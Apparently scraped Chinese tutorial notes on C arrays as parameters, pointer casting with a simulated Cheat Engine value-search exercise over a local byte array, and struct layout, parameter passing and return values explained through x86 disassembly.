之前我们学习过函数参数的传递，如下这个例子，调用plus函数后打印输出x的值仍是1，没有发生变化。因为函数参数传递只是传了一份副本，是值传递，在plus函数中对x的修改并不影响main函数中x的值。 1234567891011121314#include &quot;stdafx.h&quot;void plus(int p)&#123; p = p + 1;&#125;int main()&#123; int x = 1; plus(x); printf(&quot;%d &quot;, x); return 0;&#125; 如果函数参数是一个数组，它也是值传递吗？ 定义数组参数时方括号中不要写常量; 数组作为参数进行传递时，要传递数组的长度 12345678910111213141516#include &quot;stdafx.h&quot;void printArray(int arr[], int nLength)&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, arr[i]); &#125;&#125;int main()&#123; int arr[5] = &#123;1, 2, 3, 4, 5&#125;; printArray(arr, 5); return 0;&#125; 在汇编中，可以看到是将数组第一个元素的地址作为参数传进了printArray函数 小结：数组作为参数时，传递的是地址。 那我们写printArray的参数时直接写个指针，调用函数时将数组首地址传给这个指针不也可以？ 12345678910111213141516#include &quot;stdafx.h&quot;void printArray(int* p, int nLength)&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, *(p+i)); &#125;&#125;int main()&#123; int arr[5] = &#123;1, 2, 3, 4, 5&#125;; printArray(arr, 5); return 0;&#125; 汇编代码和上一张截图是一样的 小结，如下写法都是可行的： 12345678void printArray(int arr[], int nLength) //参数声明是arr[]&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, arr[i]); //写法一 printf(&quot;%d &quot;, *(arr+i)); //写法二 &#125;&#125; 12345678void printArray(int* p, int nLength) //参数声明是*p&#123; for (int i = 0; i &lt; nLength; i++) &#123; printf(&quot;%d &quot;, *(p+i)); //写法一 printf(&quot;%d &quot;, p[i]); //写法二 &#125;&#125; 类型转换 char,short,int这些基本类型之间能强转 1234int x = 10; char y = x; // 简写char y = (char)x; // 完整写法 不能将int类型转成自定义结构体 12345678910111213struct Student&#123; int id; int level;&#125;;void Test()&#123; int x = 10; Student s = x; //简写写法，不行，编译不通过。编译器报错：无法将int类型转成struct Student类型 Student s = (Student)x; //完整写法，不行，编译不通过。编译器报错：无法将int类型转成struct Student类型&#125; 指针之间，可以强转 例1 加(int*)强转，编译通过 例2 基本类型强转为结构体指针类型，ok 例3 不同级别的指针之间强转 用途：给一块内存，让自己随心所欲地访问这块内存，自己想几字节访问就几字节访问 模拟实现CE的数据搜索功能 CE是一款能对进程空间搜索数据的软件，因为我们还没学到win32相关的知识，如何打开进程，搜索进程。这里就以一个char型数组来表示进程空间中的某段数据。 这一堆数据中存储了角色的血值信息，假设血值的类型为int类型，值为100(10进制)，请列出所有可能的值以及该值对应的地址。 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 热身： 通过char指针遍历数据，找出值为100的 通过short指针遍历数据，找出值为100的 通过int指针遍历数据，找出值为100的 小端序，假设是int类型，计算机读0x00,0x01,0x02,0x03时，实际上是0x03，0x02，0x01，0x00。 当然，写代码时直接写*p=100。只是人为看这堆数据时要反过来 答案char指针short指针int指针12345678910111213141516171819202122232425262728#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; char* p = (char*)data; //data是char类型，和指针类型一致 for (int i = 0; i &lt; 100 ; i++) //100个数据，char长度是1，一共100次，0-100 &#123; if (*(p + i) == 100) &#123; printf(&quot;%d: %p %d &quot;, i, p + i, *(p + i)); &#125; &#125; return 0;&#125;检查，按char依次打印每个值：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991000: 00424A30 0 1: 00424A31 1 2: 00424A32 2 3: 00424A33 3 4: 00424A34 4 5: 00424A35 5 6: 00424A36 6 7: 00424A37 7 8: 00424A38 7 9: 00424A39 9 10: 00424A3A 0 11: 00424A3B 32 12: 00424A3C 16 13: 00424A3D 3 14: 00424A3E 3 15: 00424A3F 12 16: 00424A40 0 17: 00424A41 0 18: 00424A42 68 19: 00424A43 0 20: 00424A44 0 21: 00424A45 51 22: 00424A46 0 23: 00424A47 71 24: 00424A48 12 25: 00424A49 14 26: 00424A4A 0 27: 00424A4B 13 28: 00424A4C 0 29: 00424A4D 17 30: 00424A4E 0 31: 00424A4F 0 32: 00424A50 0 33: 00424A51 2 34: 00424A52 100 35: 00424A53 0 36: 00424A54 0 37: 00424A55 0 38: 00424A56 -86 39: 00424A57 0 40: 00424A58 0 41: 00424A59 0 42: 00424A5A 100 43: 00424A5B 16 44: 00424A5C 0 45: 00424A5D 0 46: 00424A5E 0 47: 00424A5F 0 48: 00424A60 0 49: 00424A61 0 50: 00424A62 0 51: 00424A63 0 52: 00424A64 2 53: 00424A65 0 54: 00424A66 116 55: 00424A67 15 56: 00424A68 65 57: 00424A69 0 58: 00424A6A 0 59: 00424A6B 0 60: 00424A6C 1 61: 00424A6D 0 62: 00424A6E 0 63: 00424A6F 0 64: 00424A70 5 65: 00424A71 0 66: 00424A72 0 67: 00424A73 0 68: 00424A74 10 69: 00424A75 0 70: 00424A76 0 71: 00424A77 2 72: 00424A78 116 73: 00424A79 15 74: 00424A7A 65 75: 00424A7B 0 76: 00424A7C 6 77: 00424A7D 8 78: 00424A7E 0 79: 00424A7F 0 80: 00424A80 0 81: 00424A81 0 82: 00424A82 0 83: 00424A83 100 84: 00424A84 0 85: 00424A85 15 86: 00424A86 0 87: 00424A87 0 88: 00424A88 13 89: 00424A89 0 90: 00424A8A 0 91: 00424A8B 0 92: 00424A8C 35 93: 00424A8D 0 94: 00424A8E 0 95: 00424A8F 100 96: 00424A90 0 97: 00424A91 0 98: 00424A92 100 99: 00424A93 0 12345678910111213141516171819202122232425262728#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; short* p = (short*)data; //data是char类型，要转成和指针一样的类型 for (int i = 0; i &lt; 100 / 2; i++) //100个数据，short长度是2，一共50次，0-50 &#123; if (*(p + i) == 100) &#123; printf(&quot;%d: %p %d &quot;, i, p + i, *(p + i)); &#125; &#125; return 0;&#125;检查，按short依次打印每个值：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849500: 00424A30 256 1: 00424A32 770 2: 00424A34 1284 3: 00424A36 1798 4: 00424A38 2311 5: 00424A3A 8192 6: 00424A3C 784 7: 00424A3E 3075 8: 00424A40 0 9: 00424A42 68 10: 00424A44 13056 11: 00424A46 18176 12: 00424A48 3596 13: 00424A4A 3328 14: 00424A4C 4352 15: 00424A4E 0 16: 00424A50 512 17: 00424A52 100 18: 00424A54 0 19: 00424A56 170 20: 00424A58 0 21: 00424A5A 4196 22: 00424A5C 0 23: 00424A5E 0 24: 00424A60 0 25: 00424A62 0 26: 00424A64 2 27: 00424A66 3956 28: 00424A68 65 29: 00424A6A 0 30: 00424A6C 1 31: 00424A6E 0 32: 00424A70 5 33: 00424A72 0 34: 00424A74 10 35: 00424A76 512 36: 00424A78 3956 37: 00424A7A 65 38: 00424A7C 2054 39: 00424A7E 0 40: 00424A80 0 41: 00424A82 25600 42: 00424A84 3840 43: 00424A86 0 44: 00424A88 13 45: 00424A8A 0 46: 00424A8C 35 47: 00424A8E 25600 48: 00424A90 0 49: 00424A92 100 12345678910111213141516171819202122232425262728#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; int* p = (int*)data; //data是char类型，要转成和指针一样的类型 for (int i = 0; i &lt; 100 / 4; i++) //100个数据，int长度是4，一共25次，0-25 &#123; if (*(p + i) == 100) &#123; printf(&quot;%d: %p %d &quot;, i, p + i, *(p + i)); &#125; &#125; return 0;&#125;检查，按int依次打印每个值：123456789101112131415161718192021222324250: 00424A30 50462976 1: 00424A34 117835012 2: 00424A38 536873223 3: 00424A3C 201523984 4: 00424A40 4456448 5: 00424A44 1191195392 6: 00424A48 218107404 7: 00424A4C 4352 8: 00424A50 6554112 9: 00424A54 11141120 10: 00424A58 274989056 11: 00424A5C 0 12: 00424A60 0 13: 00424A64 259260418 14: 00424A68 65 15: 00424A6C 1 16: 00424A70 5 17: 00424A74 33554442 18: 00424A78 4263796 19: 00424A7C 2054 20: 00424A80 1677721600 21: 00424A84 3840 22: 00424A88 13 23: 00424A8C 1677721635 24: 00424A90 6553600 上述做法的问题 这只是一堆数据，在搜索进程空间时你不知道这堆数据是怎么组合的，它不一定就是int类型，也不一定恰好int挨着int。有可能这是char，下一个是int，下一个是short，都有可能。 所以正确的搜索方式应该是如下： 假设一个int类型的指针进行搜索， 第一次，从第一个字节开始查，读了0x00,0x01,0x02,0x03，指针移动1个字节，指向下一个字节0x01 第一次，从第二个字节开始查（而不是移动4个字节，从0x04开始查），读了0x01,0x02,0x03,0x04，指针再移动1个字节，指向下一个字节0x03 以此类推 问题： int类型指针读取数据，一次读4个字节；每+1，加4个字节。按照我们上面的说法，迭代时应该前进1个字节，而不是4个字节。怎么做？ 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 答案读数据时用int类型指针，步进时用char类型指针。数据的范围是[0-length-1]，在这个例子是[0-99]，int类型搜，最后一个数应是96。即length-1-3（最后一个数在走3个字节就到最后一个字节）。我写的chatGPT版123456789101112131415161718192021222324252627282930313233#include &quot;stdafx.h&quot;char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;;int main()&#123; int *int_p = (int *)data; char *p = data; for (int i = 0; i &lt; 100 - 3; i++) &#123; //printf(&quot;%d: %p %d &quot;,i, int_p,*int_p); if ((*int_p) == 100) &#123; printf(&quot;%d: %p %d &quot;,i, int_p,*int_p); &#125; ++p; int_p = (int *)p; &#125; return 0;&#125;chatgpt用for里的计数器i来迭代。另外，使用了void *来打印地址，因为%p格式化字符串期望一个void *类型的参数。这样可以避免编译器警告1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot;int main()&#123; unsigned char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 &#125;; for (int i = 0; i &lt; 100 - 3; ++i) &#123; int value = *(int*)&amp;data[i]; // Cast the address to an int pointer and dereference it if (value == 100) &#123; printf(&quot;Address: %p Value: %d &quot;, (void *)&amp;data[i], value); &#125; &#125; return 0;&#125;依次打印，检验：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596970: 00424A30 50462976 1: 00424A31 67305985 2: 00424A32 84148994 3: 00424A33 100992003 4: 00424A34 117835012 5: 00424A35 117900805 6: 00424A36 151455494 7: 00424A37 591623 8: 00424A38 536873223 9: 00424A39 270532617 10: 00424A3A 51388416 11: 00424A3B 50532384 12: 00424A3C 201523984 13: 00424A3D 787203 14: 00424A3E 3075 15: 00424A3F 1140850700 16: 00424A40 4456448 17: 00424A41 17408 18: 00424A42 855638084 19: 00424A43 3342336 20: 00424A44 1191195392 21: 00424A45 205979699 22: 00424A46 235685632 23: 00424A47 920647 24: 00424A48 218107404 25: 00424A49 851982 26: 00424A4A 285216000 27: 00424A4B 1114125 28: 00424A4C 4352 29: 00424A4D 17 30: 00424A4E 33554432 31: 00424A4F 1677852672 32: 00424A50 6554112 33: 00424A51 25602 34: 00424A52 100 35: 00424A53 -1442840576 36: 00424A54 11141120 37: 00424A55 43520 38: 00424A56 170 39: 00424A57 1677721600 40: 00424A58 274989056 41: 00424A59 1074176 42: 00424A5A 4196 43: 00424A5B 16 44: 00424A5C 0 45: 00424A5D 0 46: 00424A5E 0 47: 00424A5F 0 48: 00424A60 0 49: 00424A61 33554432 50: 00424A62 131072 51: 00424A63 1946157568 52: 00424A64 259260418 53: 00424A65 1091531776 54: 00424A66 4263796 55: 00424A67 16655 56: 00424A68 65 57: 00424A69 16777216 58: 00424A6A 65536 59: 00424A6B 256 60: 00424A6C 1 61: 00424A6D 83886080 62: 00424A6E 327680 63: 00424A6F 1280 64: 00424A70 5 65: 00424A71 167772160 66: 00424A72 655360 67: 00424A73 2560 68: 00424A74 33554442 69: 00424A75 1946288128 70: 00424A76 259260928 71: 00424A77 1091531778 72: 00424A78 4263796 73: 00424A79 100679951 74: 00424A7A 134611009 75: 00424A7B 525824 76: 00424A7C 2054 77: 00424A7D 8 78: 00424A7E 0 79: 00424A7F 0 80: 00424A80 1677721600 81: 00424A81 6553600 82: 00424A82 251683840 83: 00424A83 983140 84: 00424A84 3840 85: 00424A85 218103823 86: 00424A86 851968 87: 00424A87 3328 88: 00424A88 13 89: 00424A89 587202560 90: 00424A8A 2293760 91: 00424A8B 8960 92: 00424A8C 1677721635 93: 00424A8D 6553600 94: 00424A8E 25600 95: 00424A8F 1677721700 96: 00424A90 6553600"},{"title":"结构体","path":"/wiki/C/结构体.html","content":"前言 当需要一个容器能够存储1个字节，你会怎么做？使用char。 当需要一个容器能够存储4个字节，你会怎么做？ 使用int。 当需要一个容器能够存储100个2个字节的数据，你会怎么做？ 使用short arr[100]。 当需要一个容器能够存储5个数据，这5个数据中有1字节的，2字节的有10字节的…你会怎么做？ （数组只能是相同类型的） 答案：结构体 定义 char/int/数组等类型是编译器已知类型，我们称之为内置类型。我们可以用结构体，将不同类型的数据组合成一个新的数据类型，告诉编译器这是我们自定义的类型。 结构声明（structure declaration）如下： 123456struct 类型名&#123; // 可以定义多种类型 int a; char b; short c;&#125;; 如上代码所示我们仅仅是告诉编译器，我们定义的类型是什么样的，这段代码本身并不会占用内存空间。 结构体声明的位置和变量一样，都存在全局和局部的属性。 结构体在定义的时候，除了本身以外可以使用任何类型。（要不就死循环了，编译器不知道怎么为这个结构体分配空间） 支持的写法12345678910111213struct st1&#123; char a; short b; int arr[10];&#125;;struct st2&#123; char a; short b; st1 s;&#125;; 错误的写法123456struct st1&#123; char a; short b; st1 s; //成员又包含了自身，逻辑上会死循环&#125;; 结构体变量的读写 用结构成员运算符. 1234567891011121314151617struct stPoint&#123; int x; int y;&#125;;stPoint point = &#123;10,20&#125;;int x;int y;// readx = point.x;y = point.y;// writepoint.x = 100;point.y = 200; 结构声明时便定义了变量 1234567891011121314struct stPoint&#123; int x; int y;&#125;point1,point2,point3;point1.x = 1;point1.y = 2;point2.x = 3;point2.y = 4;point3.x = 5;point3.y = 6; 反汇编 如果我定义一个结构体，里面都是等宽的成员，那它的反汇编代码和数组一样，逆向时可以还原成数组。 逆向是功能还原，而不是代码还原，代码还原会累死人的 结构体数组变量1234567891011121314151617181920212223#include &quot;stdafx.h&quot;struct st&#123; int a; int b; int c;&#125;;void Function()&#123; st x; x.a=10; x.b=20; x.c=30;&#125;int main()&#123; Function(); return 0;&#125; 编译器分配的空间是4C-40h=0xCh 123456789101112#include &quot;stdafx.h&quot;void Function()&#123; int arr[3] = &#123;10, 20, 30&#125;;&#125;int main()&#123; Function(); return 0;&#125; 编译器分配的空间是4C-40h=0xCh 1234567891011121314#include &quot;stdafx.h&quot;void Function()&#123; int a=10; int b=20; int c=30;&#125;int main()&#123; Function(); return 0;&#125; 编译器分配的空间是4C-40h=0xCh 结构体作为参数 这块不用作总结，看懂结构体类型是怎么传的参数就行。 例1 123456789101112131415161718192021222324#include &quot;stdafx.h&quot;struct st&#123; char a; short b; int c;&#125;;void Function(st s)&#123;&#125;int main()&#123; st s; s.a=1; s.b=2; s.c=3; Function(s); return 0;&#125; char和short类型一起以4字节进行参数传递了。 例2 12345678910111213141516171819202122232425262728293031#include &quot;stdafx.h&quot;struct st&#123; int a; int b; int c; int d; int e; int f;&#125;;void Function(st s)&#123;&#125;int main()&#123; st s; s.a=1; s.b=2; s.c=3; s.c=4; s.c=5; s.c=6; Function(s); return 0;&#125; 上面对局部变量赋值的汇编代码好像bug了，没关系，不是重点。 在我们之前的学习，函数参数传递有两种方式，堆栈和寄存器。当函数参数较少时，编译器生成push 参数的指令，将参数逐个压入堆栈。现在这个例子传的参数比较多，编译器觉得比较麻烦，就用重复执行movsd的方式进行传参。效果和push 参数（压入参数，esp减去相应的值一样）。 12345SUB ESP,18MOV ECX,6LEA ESI,DWORD PTR SS:[EBP-18]MOV EDI,ESPREP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] 小结：当传递的参数特别多时，计算机采用的是将一大块内存复制到另一块内存的方式。 结构体作为返回值 1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot;struct st&#123; char a; short b; int c; int d; int e;&#125;;st Function()&#123; st s; s.a = 1; s.b = 2; s.c = 3; s.d = 4; s.e = 5; return s;&#125;;int main(int argc, char *argv[])&#123; st s = Function(); return 0;&#125; main函数的反汇编Function函数的反汇编1234567891011121314151617181920212223242526272829303132333435363738394041424344454627: int main(int argc, char *argv[])28: &#123;00401050 push ebp00401051 mov ebp,esp00401053 sub esp,70h00401056 push ebx00401057 push esi00401058 push edi00401059 lea edi,[ebp-70h]0040105C mov ecx,1Ch00401061 mov eax,0CCCCCCCCh00401066 rep stos dword ptr [edi]29: st s = Function();00401068 lea eax,[ebp-30h]0040106B push eax0040106C call @ILT+10(Function) (0040100f)00401071 add esp,400401074 mov ecx,dword ptr [eax]00401076 mov dword ptr [ebp-20h],ecx00401079 mov edx,dword ptr [eax+4]0040107C mov dword ptr [ebp-1Ch],edx0040107F mov ecx,dword ptr [eax+8]00401082 mov dword ptr [ebp-18h],ecx00401085 mov edx,dword ptr [eax+0Ch]00401088 mov dword ptr [ebp-14h],edx0040108B mov eax,dword ptr [ebp-20h]0040108E mov dword ptr [ebp-10h],eax00401091 mov ecx,dword ptr [ebp-1Ch]00401094 mov dword ptr [ebp-0Ch],ecx00401097 mov edx,dword ptr [ebp-18h]0040109A mov dword ptr [ebp-8],edx0040109D mov eax,dword ptr [ebp-14h]004010A0 mov dword ptr [ebp-4],eax30:31: return 0;004010A3 xor eax,eax32: &#125;004010A5 pop edi004010A6 pop esi004010A7 pop ebx004010A8 add esp,70h004010AB cmp ebp,esp004010AD call __chkesp (004010e0)004010B2 mov esp,ebp004010B4 pop ebp004010B5 ret12345678910111213141516171819202122232425262728293031323334353637383940414215: st Function()16: &#123;0040D4D0 push ebp0040D4D1 mov ebp,esp0040D4D3 sub esp,50h0040D4D6 push ebx0040D4D7 push esi0040D4D8 push edi0040D4D9 lea edi,[ebp-50h]0040D4DC mov ecx,14h0040D4E1 mov eax,0CCCCCCCCh0040D4E6 rep stos dword ptr [edi]17: st s;18: s.a = 1;0040D4E8 mov byte ptr [ebp-10h],119: s.b = 2;0040D4EC mov word ptr [ebp-0Eh],offset Function+20h (0040d4f0)20: s.c = 3;0040D4F2 mov dword ptr [ebp-0Ch],321: s.d = 4;0040D4F9 mov dword ptr [ebp-8],422: s.e = 5;0040D500 mov dword ptr [ebp-4],523:24: return s;0040D507 mov eax,dword ptr [ebp+8]0040D50A mov ecx,dword ptr [ebp-10h]0040D50D mov dword ptr [eax],ecx0040D50F mov edx,dword ptr [ebp-0Ch]0040D512 mov dword ptr [eax+4],edx0040D515 mov ecx,dword ptr [ebp-8]0040D518 mov dword ptr [eax+8],ecx0040D51B mov edx,dword ptr [ebp-4]0040D51E mov dword ptr [eax+0Ch],edx0040D521 mov eax,dword ptr [ebp+8]25: &#125;;0040D524 pop edi0040D525 pop esi0040D526 pop ebx0040D527 mov esp,ebp0040D529 pop ebp0040D52A ret 我们主要分析main函数调用Function函数前和调用后的反汇编，以及Function函数给局部变量赋值后，是怎么将结构体变量返回的 main函数调用Function函数前和调用后的反汇编代码Function函数内部，返回前的代码12345678910111213141516171819202129: st s = Function();00401068 lea eax,[ebp-30h]0040106B push eax0040106C call @ILT+10(Function) (0040100f)00401071 add esp,400401074 mov ecx,dword ptr [eax]00401076 mov dword ptr [ebp-20h],ecx00401079 mov edx,dword ptr [eax+4]0040107C mov dword ptr [ebp-1Ch],edx0040107F mov ecx,dword ptr [eax+8]00401082 mov dword ptr [ebp-18h],ecx00401085 mov edx,dword ptr [eax+0Ch]00401088 mov dword ptr [ebp-14h],edx0040108B mov eax,dword ptr [ebp-20h]0040108E mov dword ptr [ebp-10h],eax00401091 mov ecx,dword ptr [ebp-1Ch]00401094 mov dword ptr [ebp-0Ch],ecx00401097 mov edx,dword ptr [ebp-18h]0040109A mov dword ptr [ebp-8],edx0040109D mov eax,dword ptr [ebp-14h]004010A0 mov dword ptr [ebp-4],eax123456789101124: return s;0040D507 mov eax,dword ptr [ebp+8]0040D50A mov ecx,dword ptr [ebp-10h]0040D50D mov dword ptr [eax],ecx0040D50F mov edx,dword ptr [ebp-0Ch]0040D512 mov dword ptr [eax+4],edx0040D515 mov ecx,dword ptr [ebp-8]0040D518 mov dword ptr [eax+8],ecx0040D51B mov edx,dword ptr [ebp-4]0040D51E mov dword ptr [eax+0Ch],edx0040D521 mov eax,dword ptr [ebp+8] 调用Function函数前将[ebp-30h]的地址压入堆栈 我们定义的Function是无参的，但是编译器生成了如下代码，将[ebp-30h]的地址压入堆栈，随后才执行call调用函数。 123400401068 lea eax,[ebp-30h]0040106B push eax0040106C call @ILT+10(Function) (0040100f)00401071 add esp,4 ebp-30是哪里？就是main函数缓冲区的一个地址，目前[ebp-30]是0xCCCCCCC。压这个参数干什么？ 答：外层函数main函数用这块内存来存Function函数返回的一大堆值。 因为Funtion函数要返回一个结构体变量，占的空间比较多。编译时就知道了main函数要接收从Function函数返回来的比较多的数，所以编译器会增加main函数的缓冲区大小，多出来的空间用来接收Funtion函数返出来的一大堆值。 Function函数返回前 在Funtion函数中对局部变量赋值。 1234567891018: s.a = 1;0040D4E8 mov byte ptr [ebp-10h],119: s.b = 2;0040D4EC mov word ptr [ebp-0Eh],offset Function+20h (0040d4f0)20: s.c = 3;0040D4F2 mov dword ptr [ebp-0Ch],321: s.d = 4;0040D4F9 mov dword ptr [ebp-8],422: s.e = 5;0040D500 mov dword ptr [ebp-4],5 随后取出[ebp+8]取出放入eax。[ebp+8]就是上一步压入堆栈的参数（main函数栈帧的ebp-30）。然后将局部变量的值逐个移动到main函数栈帧的ebp-30—ebp-30+0xC位置。 12345678910110040D50A mov ecx,dword ptr [ebp-10h]0040D50D mov dword ptr [eax],ecx0040D50F mov edx,dword ptr [ebp-0Ch]0040D512 mov dword ptr [eax+4],edx0040D515 mov ecx,dword ptr [ebp-8]0040D518 mov dword ptr [eax+8],ecx0040D51B mov edx,dword ptr [ebp-4]0040D51E mov dword ptr [eax+0Ch],edx 在返回前，重新将[ebp+8]的值赋给eax。 10040D521 mov eax,dword ptr [ebp+8] 随后，调用结束，Function函数的栈帧关闭，回到main函数的栈帧。 main函数中将ebp-30—ebp-30+0xC位置的值移动到ebp-20—ebp-14。 123456789101100401074 mov ecx,dword ptr [eax]00401076 mov dword ptr [ebp-20h],ecx00401079 mov edx,dword ptr [eax+4]0040107C mov dword ptr [ebp-1Ch],edx0040107F mov ecx,dword ptr [eax+8]00401082 mov dword ptr [ebp-18h],ecx00401085 mov edx,dword ptr [eax+0Ch]00401088 mov dword ptr [ebp-14h],edx 将ebp-20—ebp-14位置的值赋值给局部变量s的各个成员。 12345678910110040108B mov eax,dword ptr [ebp-20h]0040108E mov dword ptr [ebp-10h],eax00401091 mov ecx,dword ptr [ebp-1Ch]00401094 mov dword ptr [ebp-0Ch],ecx00401097 mov edx,dword ptr [ebp-18h]0040109A mov dword ptr [ebp-8],edx0040109D mov eax,dword ptr [ebp-14h]004010A0 mov dword ptr [ebp-4],eax 